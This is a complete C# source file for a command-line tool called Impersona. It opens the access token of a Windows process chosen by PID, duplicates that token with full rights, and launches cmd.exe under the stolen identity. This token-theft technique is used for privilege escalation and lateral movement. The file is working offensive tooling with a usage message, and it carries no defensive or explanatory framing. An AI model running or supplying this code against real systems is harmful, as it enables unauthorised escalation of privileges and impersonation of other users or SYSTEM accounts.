using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
using System.Threading.Tasks;
using System.Security.Principal;

namespace impersona
{
    class Impersona
    {
        [DllImport("advapi32.dll")]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            DesiredAccess DesiredAccess,
            out IntPtr TokenHandle);

        public enum DesiredAccess : uint
        {
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            TOKEN_ASSIGN_PRIMARY = 0x0001,
            TOKEN_DUPLICATE = 0x0002,
            TOKEN_IMPERSONATE = 0x0004,
            TOKEN_QUERY = 0x0008,
            TOKEN_QUERY_SOURCE = 0x0010,
            TOKEN_ADJUST_PRIVILEGES = 0x0020,
            TOKEN_ADJUST_GROUPS = 0x0040,
            TOKEN_ADJUST_DEFAULT = 0x0080,
            TOKEN_ADJUST_SESSIONID = 0x0100,
            TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),

            TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
            TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
            TOKEN_ADJUST_SESSIONID)
        }

        [DllImport("advapi32.dll")]
        public extern static bool DuplicateTokenEx(
            IntPtr hExistingToken,
            TokenAccess dwDesiredAccess,
            ref SECURITY_ATTRIBUTES lpTokenAttributes,
            SecurityImpersonationLevel ImpersonationLevel,
            TokenType TokenType,
            out IntPtr phNewToken);

        public enum TokenAccess : uint
        {
            TOKEN_ASSIGN_PRIMARY = 0x0001,
            TOKEN_DUPLICATE = 0x0002,
            TOKEN_IMPERSONATE = 0x0004,
            TOKEN_QUERY = 0x0008,
            TOKEN_QUERY_SOURCE = 0x0010,
            TOKEN_ADJUST_PRIVILEGES = 0x0020,
            TOKEN_ADJUST_GROUPS = 0x0040,
            TOKEN_ADJUST_DEFAULT = 0x0080,
            TOKEN_ADJUST_SESSIONID = 0x0100,
            TOKEN_ALL_ACCESS_P = 0x000F00FF,
            TOKEN_ALL_ACCESS = 0x000F01FF,
            TOKEN_READ = 0x00020008,
            TOKEN_WRITE = 0x000200E0,
            TOKEN_EXECUTE = 0x00020000
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDeor;
            public int bInheritHandle;
        }

        public enum SecurityImpersonationLevel
        {
            SECURITY_ANONYMOUS,
            SECURITY_IDENTIFICATION,
            SECURITY_IMPERSONATION,
            SECURITY_DELEGATION
        }

        public enum TokenType
        {
            TOKEN_PRIMARY = 1,
            TOKEN_IMPERSONATION
        }

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            PROCESS_QUERY_INFORMATION = 0x0400
        }

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(
        IntPtr hToken,
        LogonFlags dwLogonFlags,
        string lpApplicationName,
        string lpCommandLine,
        CreationFlags dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        internal struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        public enum LogonFlags
        {
            LOGON_WITH_PROFILE = 0x00000001,
            LOGON_NETCREDENTIALS_ONLY = 0x00000002
        }

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }

        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("Usage: Impersona.exe [PID]");
                Console.WriteLine("Example: Impersona.exe 4456");
                return;
            }

            int PID = Int32.Parse(args[0]);

            var hToken = IntPtr.Zero;
            var hTokenDup = IntPtr.Zero;

            // open handle to process
            var process = Process.GetProcessById(PID);

            try
            {
                // open handle to token
                if (!OpenProcessToken(process.Handle, DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
                {
                    Console.WriteLine("Failed to open process token");
                    return;
                }

                // duplicate token
                var sa = new SECURITY_ATTRIBUTES();
                if (!DuplicateTokenEx(hToken, TokenAccess.TOKEN_ALL_ACCESS, ref sa, SecurityImpersonationLevel.SECURITY_IMPERSONATION,
                    TokenType.TOKEN_IMPERSONATION, out hTokenDup))
                {
                    Console.WriteLine("Failed to duplicate token");
                    return;
                }

                // create cmd process
                var si = new STARTUPINFO();
                PROCESS_INFORMATION pi;
                if (!CreateProcessWithTokenW(hTokenDup, LogonFlags.LOGON_NETCREDENTIALS_ONLY, "C:\\Windows\\system32\\cmd.exe", null, CreationFlags.NewConsole, IntPtr.Zero, null, ref si, out pi))
                {
                    Console.WriteLine("It was not possible to create the process!");
                    return;
                }
                else
                {
                    Console.WriteLine("Success!!!");
                    return;
                }
            }

            catch
            {

            }

            finally
            {
                // close token handles
                if (hToken != IntPtr.Zero) CloseHandle(hToken);
                if (hTokenDup != IntPtr.Zero) CloseHandle(hTokenDup);

                process.Dispose();
            }

            Console.WriteLine("Unknown error");
            return;
        }
    }
}